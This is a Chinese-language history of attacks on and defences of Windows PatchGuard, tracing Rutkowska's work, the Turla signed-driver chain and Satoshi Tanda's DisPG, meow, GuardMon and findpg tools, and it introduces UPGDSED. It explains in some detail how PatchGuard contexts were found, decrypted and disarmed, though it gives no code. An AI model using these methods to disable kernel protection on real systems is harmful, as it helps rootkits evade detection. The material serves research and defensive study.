**理论线——Rutkowska 划出盲区地图**：2006 年 7–8 月（SyScan 与 Black Hat），Joanna Rutkowska 的《Subverting Vista Kernel For Fun And Profit》做了两件事。第一件严格说打的不是 PatchGuard 而是它的搭档——驱动签名：Vista 允许用户态程序以管理员权限做原始磁盘读写，她据此构造了**页面文件攻击**——用吃光内存的办法逼内核把可分页的驱动代码换出到 pagefile，直接在磁盘上改掉那份代码，再诱导内核把改过的代码调回来执行，未签名代码就这样进了内核。这提醒了所有人：**准入与巡查之间还有"磁盘上的代码"这条缝**。第二件事是她的分类法，后来成了讨论 PatchGuard 的标准语言：**第一类感染**（改代码与静态结构——PatchGuard 能查）、**第二类感染**（改动态数据结构——PatchGuard 基本无感）、**第三类感染**（hypervisor 层——PatchGuard 根本不在同一层）。同一场演讲的后半段 Blue Pill 正是第三类的演示：用 AMD 虚拟化把正在运行的系统整体抬进一台攻击者控制的虚拟机。**2006 年这一年，三条战线（拆哨兵、争生态、换图层）就已经全部摆上了桌面。**

## 第三幕（2007–2012）：签名驱动即武器，防线开始外扩

**2007 年，预言**：Black Hat 2007，Rutkowska 与 Tereshkin 的《IsGameOver(), anyone?》把话说透：**Vista 的内核保护可以用大厂写得糟糕的合法签名驱动当跳板绕过**（演讲中点名了当时的显卡驱动为例）。逻辑很冷酷：签名只证明"这驱动是谁发的"，不证明"这驱动没留后门"；只要生态里存在一个签名合法、却能提供任意内核读写的驱动，PatchGuard 与签名体系面对的就是一扇挂着正牌锁的后门。这一判断在当时是演讲，在十年后成了整个行业的标准攻击范式，名字叫 BYOVD。

**微软这一时期的反制节奏**——按 KPP 公开条目的概括：自 2005 年诞生后微软发布了**两次主要更新，每一次都专门设计来打掉上一版已知的绕过**；细节从不公布，只随版本（Vista SP1/Server 2008、Windows 7、Windows 8）整体更换实现：上下文档案与触发组合再洗牌、保护清单继续扩（后来 0x109 的类型表排到 win32k 整体与会话空间，就是这段时期持续扩编的化石记录）。

**补注（2026-10-31 核 Uninformed 全集目录时补正）**：上述"第二次主要更新"有确切出处——Skywing 在 Uninformed 第 8 卷的《PatchGuard Reloaded: A Brief Analysis of PatchGuard Version 3》明确称之为 **PatchGuard 第 3 版**：随 Windows Server 2008 Beta 3 亮相，其后经 Windows Update 推向 Vista 与 Server 2003；该文同样给出了针对第 3 版的新一轮绕过思路与反制讨论。（该文中文全译见附录四。）本文初稿整理时未核到该文，只按"两次主要更新"保守表述，特此补正——版本编号至此有据可查：1 版（2005）、2 版（Vista 世代）、3 版（Server 2008 世代）；此后各 Windows 版本虽持续重做，公开文献未再见公认的统一编号，故本文对 Windows 7 之后仍以"逐版本重做"表述。

**2012 年，战线外扩的信号**：Windows 8 与 UEFI Secure Boot 同代登场。Secure Boot 本身不是 PatchGuard 的一部分，但它标志着微软的思路变化：**既然运行时的同级对抗没有终局，就把信任链往开机之前推**——固件先验启动管理器、启动管理器再验内核，"赶在 PatchGuard 布防之前动手"的门槛从这一代开始被系统性抬高。下一幕里攻击者对这条新防线的回应（EfiGuard 必须关 Secure Boot 才能工作），反过来证明了这步棋的分量。

## 第四幕（2013–2016）：野外实证与商品化

**野外**：2010 年代中期公开披露的 Turla（Uroburos/Snake）家族，被多家厂商与研究者记录下这样一条链（Tanda 与 Korkin 2017 年的会议论文即以该家族使用的这类驱动链做过实测演示）：**先加载一个合法签名的驱动，再利用它的漏洞加载未签名恶意驱动**，以此同时击败签名强制与 PatchGuard。这是 2007 年那场演讲预言的野外兑现：国家级攻击者用的不是"攻破 PatchGuard"，而是"绕开它存在的理由"——既然有一把正牌钥匙能开任意的门，又何必撬锁。

**研究侧的持续解剖**：这一时期 Satoshi Tanda 把 PatchGuard 的逐版本分析做成了长期工程——博客、PgResarch 工具仓库、会议演讲与论文四种载体，接成一条跨 2014–2020 年的连载（精华见紧随其后的 Tanda 连载精华一节），并反手做了 GuardMon——用他自己的 hypervisor 框架 HyperPlatform **站在更低层监视 PatchGuard 本人的一举一动**。这一攻一守同出一源：拆解 PatchGuard 的人和给 PatchGuard 装监控的人，是同一种人、用同一种技术（站在更低层）。

### Tanda 连载精华：把每一代 PatchGuard 拆成公开记录的人（2014–2020）

先把“连载”的形态说准，免得读者按错图索骥。Satoshi Tanda（日本安全研究者，2016 年时先后供职 Sophos、CrowdStrike，做 Windows 内核逆向）并没有在一本杂志上按月刊发 PatchGuard 专栏；他留下的是一条由四种载体接成的连续公开记录：个人博客 Satoshi's note（standa-note.blogspot）、GitHub 上的 PgResarch 仓库（仓库名就是这个拼法，Research 少了一个 e，是他本人的笔误并沿用至今）、2016 年的两场会议演讲（REcon、BlueHat），以及 2017 年与 Igor Korkin 合著的 ADFSL 会议论文。每一环都对应一代 Windows：DisPG 拆 XP SP2／Vista SP2／7 SP1 与 8.1 两代实现，meow 接 8.1 的新构建与 Windows RT（ARM），《Some Tips to Analyze PatchGuard》把方法论搬上 Windows 10，GuardMon 与 findpg 则把“拆”沉淀为长期可用的监视与定位工具。攻防史正文说他“逐版本分析做成了长期连载”，指的就是这条链——版本一换，公开拆解就跟上，而且每次都附可运行的代码或可复核的转储（dump，内存内容按地址列出的原始记录），不是只发结论。

本节用到的术语先钉死。**PatchGuard 上下文（context）**：PatchGuard 在非分页池或独立页上分配的一大块自带结构，里面装着检查代码的副本、要用的内核函数指针、期望校验值，以及一串校验结构；PatchGuard 没有常驻进程，它的全部“家当”就是若干个上下文，拆 PatchGuard 第一步永远是找到它们。**校验结构（validation structure）**：上下文尾部变长数组中的一条记录，至少含“被毁区域类型、要核对的地址、期望校验和”三项，一条对应一类检查对象。**触发载体**：让上下文代码在随机时刻跑起来的系统机制——定时器（timer）、DPC（Deferred Procedure Call，延迟过程调用，中断处理里不宜久留的工作被推迟到 DISPATCH_LEVEL 由系统线程上下文借流执行的例程）、工作项（work item，排进系统工作线程队列、在 PASSIVE_LEVEL 借工作线程之流执行的任务）与系统线程，本质都是“借别人的执行流跑自己的代码”。**自校验（本文按 Tanda 的命名记作 Pg_SelfValidation）**：上下文代码的前半段校验，先查自己人（代码副本与受保护函数）是否完好；其后的主校验（他记作 FsRtlMdlReadCompleteDevEx，借一个毫不相干的导出函数之名藏身）才逐项核对整个内核。**hypervisor（虚拟机监视器）**：运行在操作系统之下（俗称 Ring −1）的软件层，能截获客户机（guest）执行特定指令与访问特定内存的事件；事件发生时硬件把执行转移给 hypervisor 的 VM-exit 处理例程（VM-exit handler，运行在 VMX root 模式、hypervisor 自己的上下文中），处理完再恢复客户机——这是 Tanda 后半程全部工具的地基，因为 PatchGuard 再会躲，也躲不开站在它下层的观察者。

#### 第一站：DisPG 与 NOTE.md（2014）——Win7 一代与 8.1 一代，两种完全不同的拆法

PgResarch 仓库的 DisPG 是概念验证代码（proof-of-concept，只为证明可行、不为实战优化），目标是在运行时解除（disarm）PatchGuard，同时顺带关掉驱动签名强制，演示方式是隐藏名字以 rk 开头的进程——能藏进程而不蓝屏，就证明哨兵已被缴械。仓库内的 NOTE.md 是这条连载的第一篇“版本分析正文”，它把 Win7 及更早、与 Win8.1 两代实现分开写，因为微软在 8.1 里把上一代的两个洞都堵了。

对 Win7 一代，Tanda 钉死两个设计缺陷。其一，加密只做一次简单 XOR（异或）：上下文待命时整块以单个 64 位密钥异或加密，而上下文开头恰是内核函数 CmpAppendDllSection 的代码副本——已知明文就在眼前。他给出的推导干净利落：拿任意内核内存逐字节与 CmpAppendDllSection 的字节模式异或，得到候选密钥；再用候选密钥解后续字节，若解出的仍是 CmpAppendDllSection 的后续字节，密钥即为真。演示输出里两个上下文的密钥一个是 0、一个是 63E62F12D1DEC502，明文摆在那里。其二，上下文的藏身处有规律：它必定位于 PoolBigPageTable（大页池表，登记所有大于一页的池分配的系统表）所追踪的区域——枚举这张表就能在现实时间内把全部上下文找全，不必盲扫整个内核内存。两洞合一，攻击闭环：枚举大页池表定位，异或试解确认并解密，然后把上下文入口——上下文被触发载体唤醒后、任何校验开始前第一个被调用的函数 CmpAppendDllSection（执行以函数调用方式进入，运行在系统线程／DPC 的借流上下文中）——覆写为一条 RET 指令；下次唤醒时控制流一进门就原路返回，校验根本没机会执行。DisPG 在 Win7 上一次性定位并解除全部上下文，正是靠这条链。

到 8.1，NOTE.md 明确写道：上述两洞已被修复——加密改为多层、不同密钥的异或；上下文改由 MmAllocateIndependentPages 分配到不被任何表直接追踪的独立页区，靠页表遍历去找的成本远高于枚举池表。于是 Tanda 换了整个思路：不再找上下文，而是画出上下文的六状态生命周期（经定时器等待→在 DPC 层级跑自校验并排工作项→在工作队列里等出队→在 PASSIVE 层级开头可能调用睡眠函数→在睡眠函数里等待→跑主校验并排定下一个上下文），然后在状态转移的必经之路上设卡，赶在主校验执行之前把上下文全部截下。设卡点是三个：KiCommitThreadWait 与 KiAttemptFastRemovePriQueue（工作项出队的必经之路，过滤出 PatchGuard 的工作项就不放行）、KeDelayExecutionThread 与 KeWaitForSingleObject 的末尾（查返回地址——从这两个睡眠函数返回、且返回地址落在 PatchGuard 代码里的线程，就是即将进入主校验的上下文执行流）、以及一个藏在 HalPerformEndOfInterrupt 减 0x4C 处的无名函数（他命名为 Pg_IndependentContextWorkItemRoutine，系统线程调度方式下替代 ExQueueWorkItem 的入口）。最后一处是他顺手钉死的一个微软疏漏：ExQueueWorkItem 本身是自校验的受保护函数、动不得，它的这个替代者却不在保护清单里，可以放心打补丁。他也诚实标注了这条路的裂缝：若某个上下文恰在他打补丁时已越过睡眠点、正处主校验中段，第二校验仍会发现补丁并蓝屏——窗口很小，他本人没撞上过，但原理上存在；且 8.1 的打法满是依赖 ntoskrnl 具体构建号的硬编码值，通用性不如人意。

这一站对攻防史的意义，要看同行的反应速度：2014 年 11 月 NoSuchCon 上，Cisco Talos 的 Andrea Allievi 在《Understanding and Defeating Windows 8.1 Kernel Patch Protection》里专列一页“Some new attacks”，把在 KiCommitThreadWait 与 KiAttemptFastRemovePriQueue 末尾挂钩的方法标注为“Tandasat method”并给出 PgResarch 链接，与他自己“伪造整个 PatchGuard 缓冲区”的新法并列。从发表到被一线会议当作既有方法引用，只隔了数月——连载的第一篇，就已经进了同行的工具箱。还要注意 NOTE.md 的参考文献表：skape 2005 年 Uninformed 原始论文、McAfee 2012 年《Defeating PatchGuard》、Positive Technologies 2014 年的 8.1 分析、Allievi 2014 年的 VRT 博客——Tanda 的每一站都明示自己站在哪几篇前作之上，这条连载从第一天起就是累积式的公开账本，而不是孤立的炫技。

#### 第二站：meow（2015）——8.1 新构建与 ARM：不用魔数

DisPG 的 8.1 打法依赖具体构建号，微软一更新就失效。2015 年 10 月发布的 meow 是正对这一痛点的重写：在 8.1（含 Windows RT 的 ARM 版）上运行时解除 PatchGuard，且不依赖与构建版本绑定的魔数（magic values，为定位特定二进制而硬编码的特征值或偏移）。它的做法是装上钩子后保持运行，等 PatchGuard 的上下文在自然调度中逐一暴露、逐一丢弃——README 明确提醒：不要急着卸载 meow.sys，若在全部上下文被检出丢弃之前撤掉，它留下的痕迹仍可能被某个尚未露面的上下文查到。支持 ARM 这一点在当时不寻常：Windows RT 设备上内核调试根本接不上，常规动态分析无从下手，Tanda 在博客里点名 meow 的两个可讲细节——ARM 支持、以及为函数安装“尾部钩子”（epilogue hook，挂在函数收尾处的钩子）而做的函数结尾检测。意义不在工具本身，而在他给连载立的规矩：每个工具发布时都明说它会死——“PatchGuard 是移动靶，这个程序不会永远有效”，工具是一次性的，方法才是要留下的东西。

#### 第三站：《Some Tips to Analyze PatchGuard》（2015 年 10 月）——方法论成文，战场是 Windows 10

这篇博客是整条连载的方法论枢纽。它开宗明义：讲的不是 meow 怎么利用，而是“你自己如何分析 PatchGuard”，因为靶子一直在动，想对 PatchGuard 做任何事，先得能自己拆它。他列了 PatchGuard 分析的四道特有门槛——相关函数没有描述性名字甚至根本没名字；函数内部大量间接调用，像 C++ 代码一样难追；某些场景下内核调试不可用；核心代码被拷到随机位置以加密形态存放，运行时根本不知道该盯哪里。然后逐道给出破解，每一条后来都被同行反复转述：

第一，找初始化函数只需按长度排序函数表：ntoskrnl 里最大的函数就是 PatchGuard 的初始化函数（他命名为 Pg_xInitializePatchGuard），它在系统初始化时执行、把上下文建在非分页内存上。第二，从它出发做交叉引用闭包：只被其他 PatchGuard 函数引用的函数，就可判定为 PatchGuard 专用；他演示了顺 KiFilterFiberContext 的调用者摸到无名函数 sub_1407339C3，再用 SEH（Structured Exception Handling，结构化异常处理，Windows 的异常分发机制）解析脚本 parse_x64_SEH.py 查出该无名函数实为 KeInitAmd64SpecificState 的异常处理块——也就是说，进入 KiFilterFiberContext 的这条执行路径是异常分发转移（KeInitAmd64SpecificState 触发除零异常，硬件异常经 IDT 落入内核异常分发，再按 SEH 记录把控制交给处理块，全程在初始化线程的内核上下文中），不是普通函数调用。他还立了命名规矩：有符号名的加 Pg_ 前缀、无名的加 Pg_x，保证成百个函数可检索、可积累。第三，用 0x109 崩溃转储反推上下文：这是全篇最见功力的一手——蓝屏不是失败，而是微软亲手打印的结构图。x64 上 0x109 的参数可这样解：Arg1 减去魔数 0xA3A03F5891C8B4E8 得上下文地址，Arg2 减去 0xB3B74BDEE4453415 得检出损坏的那条校验结构地址，Arg3 是被毁数据地址，Arg4 是被毁区域类型（文中 Windows 10 实例里 Arg4 为 1，对应 .pdata 即异常展开数据区）。他在转储里把上下文逐字段列出——开头随机字节、其后成排的内核函数指针（如 ExAcquireResourceSharedLite、ExAllocatePoolWithTag）与变量（ObpKernelHandleTable、KiUserSharedData、KiWaitNever 的副本等），再把这套偏移定义成 IDA 结构体套回静态数据库，静态与动态就此对齐。第四，发现正在执行 PatchGuard 的线程：在系统工作线程的栈回溯里找返回地址落在映像之外的帧——实例中线程 0x64 的栈是 ExpWorkerThread（工作线程入口）→ KiSwapContext／KiSwapThread（换栈切换）→ KiCommitThreadWait → KeDelayExecutionThread（借流细节与 DisPG 的状态机完全咬合：上下文正以工作项形态借工作线程之流执行，且停在睡眠点上），KeDelayExecutionThread 的返回地址指向非映像内存，那正是上下文代码；在该返回地址下断点（须已接上内核调试器，断点在被借流线程恢复执行、函数调用返回时命中），即可亲手接住 PatchGuard 的一次执行。再把断点附近的字节序列拿回 IDA 用 Alt-B 搜原像，运行时地址与静态地址就对上了。他同样写明这招的边界：PatchGuard 有时跳过睡眠函数、有时就在 ntoskrnl 映像内执行，多重启几次再查才有机会；实在接不上调试器（如 Windows RT），就用 hypervisor 按异常指令特征去认——这句结尾直接通向他的下一站。

文末他的落点值得原样记住大意：学完这三招，你已经可以开始分析 Windows 10 上的 PatchGuard 了——在成文之时，还没有人在 Windows 10 上成功利用过它；剩下要做的“只是读代码、命名字段和函数、并检验自己的分析是否正确”。交付物不是战绩，是可重复的程序。

#### 第四站：站到 PatchGuard 下层（2015–2016）——Sushi、HyperPlatform 与 GuardMon

2015 年 8 月的博客《Writing a Hypervisor for Kernel Mode Code Analysis and Fun》把动态分析的思路推到尽头：PatchGuard 的代码周期性换址，你不知道该在哪下断点；但它不管躲在哪，总要做几个“不常见动作”——改 CR0 的写保护位、复位 DR7 清硬件断点、用 SIDT／LIDT 读写中断描述符表。这些动作是指令级的，藏不住。他的概念验证 Sushi（不到 4000 行）就是按这个理路做的 ring −1 监视器：监视来自非映像内核空间的异常指令执行，一旦发现改 CR0 写保护就把当事线程停住。执行转移的机制在这里是硬件级的：客户机执行受监视指令时触发 VM-exit，CPU 把控制交给 VMX root 模式下的处理例程（hypervisor 自己的栈与地址空间），处理例程记录现场后恢复客户机继续——PatchGuard 借谁的流、换多少次址，都越不过这一层。

2016 年他把这套东西做成通用平台 HyperPlatform（约 7000–8400 行，MIT 许可，支持 Windows 7–10 的 x86／x64，开销约 10%），定位是“VM-exit 过滤平台”：把 CPUID、异常、MOV CR3、EPT（Extended Page Tables，扩展页表，hypervisor 掌管的第二级地址翻译，可按页设置读／写／执行权限并在违规时触发 VM-exit）内存访问等事件统一变成可挂逻辑的回调。GuardMon 是其上专为 PatchGuard 而作的监视器：记录非映像内核内存发起的对 CR0、CR4、调试寄存器、GDT、IDT 与 MSR（模型专用寄存器）的读写——这张清单本身就是对 PatchGuard 活动特征的逆向总结：它校验什么、就必然要读什么，它自保时必然要碰哪几个寄存器。REcon 2016 的演讲《Monitoring & Controlling Kernel-mode Events by HyperPlatform》把 GuardMon 与 MemoryMon（监视非映像池内存执行）、DdiMon（EPT 影子页隐形钩子）并列为 HyperPlatform 的三大应用；同年 BlueHat 2016 演讲里则有对 PatchGuard 最凝练的一句回应：IDT 受 PatchGuard 保护、直接改表必然等来蓝屏，解法是开启描述符表退出（desc-table exiting）位、给客户机一张“影子 IDT”——不改它保护的那张表，让 CPU 在 hypervisor 的安排下用另一张表。攻防的层级差，在这一站被他变成了工程日常。

#### 第五站：与 Korkin 的 ADFSL 论文（2017）——Turla 实战检验与“给 PatchGuard 派个狱警”

2017 年第 12 届 ADFSL 会议论文《Detect Kernel-Mode Rootkits via Real Time Logging & Controlling Memory Access》（arXiv:1705.06784）是连载的学术收口。Korkin 在演讲稿里交代了合作的来历：他读到 Tanda 博客上“如何绕过 PatchGuard 的大量研究”，才找上门来提议反过来做——用内存访问监控保护 PatchGuard。论文的实战对象正是 Turla（又名 Uroburos）：其手法是加载一个合法签名的驱动、再利用该驱动的漏洞加载未签名恶意驱动，从而同时绕过驱动签名强制与 PatchGuard（论文引言的定性是：PatchGuard 与攻击者同处一个环境，这是它先天的弱点）。三组演示里与本连载血脉最紧的是第二、三组：第二组拿 Tanda 自己的 DisPG 当测试样本——DisPG 要解除 PatchGuard，必须先读 nt!PoolBigPageTableSize 拿到大页池表地址；他们的 hypervisor 工具 MemoryMonRWX 预先把该地址设为受保护目的区间，任何未授权读取都会被 EPT 违规截下、重定向到一个假的零页（执行转移同前：读访问触发 VM-exit，处理例程改写客户机所见内容后恢复执行），DisPG 读到 0、找不到上下文，解除失败。攻击者画的地图，被防守方原样拿来布传感器——这是这条连载最锋利的一幕：公开拆解的细节越精确，防守方越知道该在哪一页、哪一个变量上设防。第三组是真实样本检验：在 64 位 Windows 7 上对 Turla 运行时，MemoryMonRWX 检出了非分页池中的代码执行，执行区里正是解包后的 rootkit 代码。论文结论部分还正式提出 HyperWarden 构想：把 PatchGuard 的活搬进 hypervisor 去做——PatchGuard 只“检测后蓝屏”、不阻止修改，也不保护第三方驱动的内存，而站在更低层的狱警可以按源／目的地址区间与访问类型逐条放行或拦截。至此，Tanda 一系的轨迹闭环了：2014 年证明同级哨兵可被同级攻击者缴械，2017 年把解法写成论文——哨兵必须搬到攻击者够不着的楼层去。

#### 第六站：findpg（2020）——把“找到上下文”做成一件公共工具

连载的尾声是工具化。findpg 是他发布的 WinDbg 调试器扩展，一条 !findpg 命令列出目标系统上 PatchGuard 分配的全部页基址，让研究者能直接数清目标环境里跑着几个上下文。它的判据综合了两条老经验：页面所属内存区类型与池标签（pooltag，三方驱动的标签会暴露其非 PatchGuard 身份），以及“随机度”启发式——取页面头 100 字节数其中 0x00 与 0xFF 的个数，真加密的页面这个数应当很小（小于 5），因为密文本该看起来随机。主机支持 Windows 7 SP1 x64 及以后，目标支持 Vista SP2 x64 及以后——从 Vista 到 Windows 10 时代，一件工具通吃，靠的正是前面各站钉死的稳定特征：上下文永远以加密形态躺在可枚举的页里。从 NOTE.md 里“教人找”到 findpg“替人找”，同一步骤走了六年，沉淀为公共基础设施。

#### 方法论价值：黑箱的半衰期，与攻守双方的账本

回看这条连载，它真正的产出不是某一次解除成功——每次成功他在发布当天就预告了失效——而是把 PatchGuard 的保密模型钉上了一个可测量的参数：**每一代实现的内部细节，从发布到被公开拆透，间隔只有数月到一两年，且拆解以可复核的形态（代码、转储、结构体定义、演示视频）留存下来，任何人可以重跑一遍验证。**PatchGuard 的防护有一半押在“你不知道它在哪、何时跑、查什么”上；这条连载等于逐年公布这三样东西的测绘结果。对攻击方，这意味着每一代的绕过成本被前人摊薄：后来者不必再从“最大的函数”找起，findpg 一条命令就给出上下文清单，状态机图直接标出该设卡的转移点——这也是为什么 2014 年的方法在当年就被 Allievi 的演讲收作既有技术、为什么其后多年的第三方解除工具（Shark、UPGDSED 一系）在参考名单里总列着 PgResarch。对防守方，同一份记录是检测工程的输入：GuardMon 的寄存器监视清单、MemoryMonRWX 的“假零页”布防点，都直接脱胎于攻击侧的地图；蓝队若想知道自己的环境能不能发现已知的缴械手法，Tanda 的工具就是现成的测试集。对微软，这条连载构成一种持续的外部审计：8.1 对 XOR 与独立页的修补恰好封死了 DisPG 在 Win7 上用的两洞，而 8.1 自己的疏漏（未受保护的 Pg_IndependentContextWorkItemRoutine）又被下一站当场点名——每代实现都必须假设自己会在数月内被拆透来设计，这正是 PatchGuard 后来逐构建重做、并最终把关键校验下沉到 hypervisor 层（HVCI／HyperGuard）的外部压力之一。也要把限度说清：这条连载证明的是“同级对抗中保密撑不久”，不是“PatchGuard 无用”——它逐年抬高的恰是绕过的时间与工程成本，而这正是绊线型防御的设计目标。Tanda 本人在论文里对 PatchGuard 的定性也是如此：它能检测、却不能阻止，且保护不了自己；他的全部工作，是把这句评价从观点变成了可复现的实验记录。

#### 本节取材说明与诚实边界

上文每一站均以本次逐页打开核实的原文为准：DisPG 仓库页与 NOTE.md、《Some Tips to Analyze PatchGuard》《Writing a Hypervisor for Kernel Mode Code Analysis and Fun》两篇博客全文、REcon 2016 与 BlueHat 2016 两份幻灯、ADFSL 2017 论文正文（含其参考文献表中 Tanda 2016-a 至 2016-l 的自引清单）、Allievi 的 NoSuchCon 2014 幻灯（旁证）。凡原文只给要点而本文展开处（如状态机的中文转述），均按 NOTE.md 的六状态原文译述，未添新结论。

#### 未核到清单

以下条目经检索但未取得可逐页核实的原文，本文一律未据其下结论，仅在此存录：

- 任务设想中“tandasat.github.io 上按 Windows 版本逐篇的 PatchGuard 博客连载”：以 site 限定检索该域名，只得到 HyperPlatform 用户文档与 BlueHat 幻灯，未发现逐版本 PatchGuard 专文；他的 PatchGuard 博文本体在 standa-note.blogspot，本次核到的专文为 2015 年两篇，其余年份的博客篇目（如 2018 年 AMSI 空字符绕过）与 PatchGuard 无关，未纳入。
- GuardMon 的独立博客专文：未检索到；其功能描述据 GuardMon 仓库 README 的镜像页、HyperPlatform 用户文档与 REcon 幻灯核实，配套演示视频（YouTube）未打开核实内容。
- meow 的仓库 README 全文：经 GitPlanet 镜像核实其要点（不支持魔数、需保持运行至上下文全部丢弃、支持 8.1 x64／ARM），仓库原文逐字版未打开；《Some Tips》开头提到的“函数结尾检测”等 qertmeow 细节，原文未展开，未核到更细的实现说明。
- Tanda 2016 年自引清单中与 PatchGuard 非直接相关的条目（如 2016-b 的日志解析用户态程序、2016-h 的 CVE-2014-0816 利用）：仅据 ADFSL 论文参考文献表存录，未逐一打开。
- ADFSL 2017 的演讲逐字稿（cdfsl17_speech）：只核实了论文正文与会议幻灯，逐字稿未逐页打开；文中“Korkin 读博客找上门”一节据演讲稿的公开检索文本与论文结构互证，措辞以论文为准。
- Windows 10 后续版本（如 RS4）的 PatchGuard 分析确有他人续作（如 Luc Reginato 的 RS4 分析），非 Tanda 本人所作，未纳入本节；Tanda 本人在 findpg（2020）之后未检索到新的 PatchGuard 版本分析专文。

#### 来源链接

- DisPG 仓库页：https://github.com/tandasat/PgResarch/tree/master/DisPG
- DisPG 实现说明 NOTE.md：https://github.com/tandasat/PgResarch/blob/master/DisPG/NOTE.md
- 《Some Tips to Analyze PatchGuard》（2015-10）：http://standa-note.blogspot.ca/2015/10/some-tips-to-analyze-patchguard.html
- 《Writing a Hypervisor for Kernel Mode Code Analysis and Fun》（2015-08）：http://standa-note.blogspot.ca/2015/08/writing-hypervisor-for-kernel-mode-code.html
- meow 发布页：https://github.com/tandasat/meow/releases/latest ；README 镜像：https://www.gitplanet.com/project/meow1618778167
- Sushi 仓库 README 镜像：https://www.gitplanet.com/project/sushi1618777662
- findpg 仓库 README 镜像：https://gitplanet.com/project/findpg
- GuardMon 仓库：https://github.com/tandasat/GuardMon
- HyperPlatform 用户文档：https://tandasat.github.io/HyperPlatform/userdocument/index.html
- REcon 2016 幻灯《Monitoring & Controlling Kernel-mode Events by HyperPlatform》：https://recon.cx/2016/resources/slides/RECON-0xA-HyperPlatform-Satoshi.pdf
- BlueHat 2016 幻灯《Hypervisors in Your Toolbox》：https://tandasat.github.io/HyperPlatform/bluehatv16/BlueHat_v16_slides.pdf
- Tanda & Korkin, ADFSL 2017 论文（arXiv:1705.06784）：https://arxiv.org/pdf/1705.06784
- 旁证：Allievi, NoSuchCon 2014 幻灯：http://www.nosuchcon.org/talks/2014/D2_01_Andrea_Allievi_Win8.1_Patch_protections.pdf

**商品化**：与研究侧同步，绕过技术在游戏外挂与内核 rootkit 社区被做成通用工具——UPGDSED 一类"启动期一键禁用 PatchGuard 与签名强制"的工具在这一时期出现并流传，把原本需要深厚逆向功底的操作降成双击。攻防的门槛结构就此改变：防守方（微软）面对的不再是少数研究者，而是任何会用工具的人。

### 详解：GuardMon 与 UPGDSED——站在更低层的人，与把手艺做成工具的人

PatchGuard 攻防史走到 2013–2016 年这一段，研究侧与商品化侧各出现了一个标志性名字：一个是 Satoshi Tanda 的 GuardMon，一个是 Fyyre 与 EP_X0FF 的 UPGDSED。前者不绕过 PatchGuard，而是用 hypervisor 监视 PatchGuard；后者不研究 PatchGuard，而是把"禁用 PatchGuard"做成任何人都能运行的程序。两者方向相反，却共享同一个前提：PatchGuard 再隐蔽、再随机，也总有比它更早、更低的一层可以下手——要么是 CPU 的虚拟化硬件，要么是内核被加载之前的启动链。本节把这两个工具的来历、机制与命运逐一讲清；机制只讲类别与原理层，不给出可照做的补丁位置与操作步骤。

先补几个本节必需的术语。**hypervisor（虚拟机监控器）**：运行在操作系统之下、直接管辖硬件虚拟化能力的一层软件，操作系统在它眼里是"客户机"（guest），它可以截获客户机里发生的特定事件。**Intel VT-x**：Intel 处理器提供的硬件虚拟化扩展，是 hypervisor 在 Intel 平台上立足的硬件基础；没有它，软件就无法名正言顺地坐到操作系统下面那一层。**EPT（Extended Page Tables，扩展页表）**：hypervisor 掌握的第二级地址翻译表，决定客户机眼中的物理地址最终落到哪里、某页内存可读、可写还是可执行；它让 hypervisor 能在客户机毫无察觉的情况下监视、改道甚至"分身"内存访问。**VM-exit（虚拟机退出）**：客户机里发生了被设定为需要上报的事件时，CPU 暂停客户机、把控制权交给 hypervisor 的那一下跳转；hypervisor 的 handler 看完、记完、必要时改完，再让客户机继续，整个过程对客户机不可见。GuardMon 的一切，都建立在"哪些事件触发 VM-exit、handler 里写什么逻辑"这两个选择上。

#### 一、GuardMon：监视哨兵的哨兵

##### 1. 先有 HyperPlatform：一个为"写工具"而写的 hypervisor

GuardMon 不是独立作品，它是 Satoshi Tanda 自研框架 HyperPlatform 的一个示范应用。要理解 GuardMon，先要理解 Tanda 为什么先写了 HyperPlatform。

Tanda 在 2016 年 REcon 大会（REcon 是以逆向工程与高级利用技术为主题的年度安全会议）上的演讲《Monitoring & Controlling Kernel-mode Events by HyperPlatform》（用 HyperPlatform 监视与控制内核态事件）里，把出发点说得很直白：当时 Windows 上缺乏好用的内核态代码分析工具——调试器与静态分析耗时，既有的轻量 hypervisor 对现代平台支持不足，功能完整的又庞大到难以理解和扩展、编译运行都不顺手，要么太慢。他的解法不是再造一个庞大的虚拟化套件，而是写一个小而透明的底座。演讲幻灯片给出的数字是：HyperPlatform 约 7KLOC（7,000 行代码量级），开销约 10%，MIT 许可证开源，支持 Windows 7–10 的 x86 与 x64，可在 Visual Studio 里直接编译、像普通 Windows 驱动一样用 WinDbg 调试，不依赖任何第三方库。HyperPlatform 的 README 则强调它对研究者友好的设计目标：代码按 Google C++ Style Guide 与 clang-format 规范书写、注释完整、无外部依赖。

这个底座的定位，REcon 大会官方页面与演讲标题用了一个准确的说法：VM-exit 过滤平台（VM-exit filtering platform）。意思是 HyperPlatform 本身不预设要监视什么，它负责把形形色色的事件变成 VM-exit 交到上层 handler 手里——可监视的事件包括对虚拟/物理内存的访问、对系统寄存器的访问、中断与异常的发生、特定指令的执行；上层工具可以自由选择启用或禁用其中哪些，并在 handler 里写自己的逻辑，甚至向客户机返回不同的寄存器值或内存内容。换句话说，HyperPlatform 卖的不是某一个功能，而是一类新的"事件来源"：在它出现之前，Windows 研究者能订阅的事件大体来自操作系统自己提供的回调与钩子；有了它，研究者可以直接订阅硬件层面的动静，而这些动静是内核态代码——包括 PatchGuard，也包括内核 rootkit——既绕不开、也看不见的。

HyperPlatform 要求运行环境支持 Intel VT-x 与 EPT。它的 README 还留了一条很有时代感的注记：在 Windows 10 RS4 之后的系统上，这项技术可能被 Windows 内核自动禁用，启动驱动时会报"hypervisor feature is not available"，原因与默认启用的 Windows Defender Credential Guard 占用虚拟化能力有关——这正是后文会反复出现的主题：hypervisor 这一层只有一个座位，谁先坐下，后来者就只能站着。REcon 幻灯片的局限一节也把话说得同样坦白：HyperPlatform 按设计不能在 VirtualBox 里运行，不支持 AMD 处理器，也不能与其它 hypervisor 同时运行。

在这个底座上，Tanda 做了一组示范工具，HyperPlatform 的 README 逐一列名：MemoryMon、EopMon、DdiMon 与 GuardMon。GuardMon 的仓库创建于 2016 年 2 月，是这一组里专门对着 PatchGuard 来的那个。

##### 2. GuardMon 到底监视什么：非映像区发出的寄存器访问

GuardMon 的 README 开门见山，只用三句话交代了它的全部设计：

第一句，它是一个基于 hypervisor 的、监视系统寄存器访问的工具。

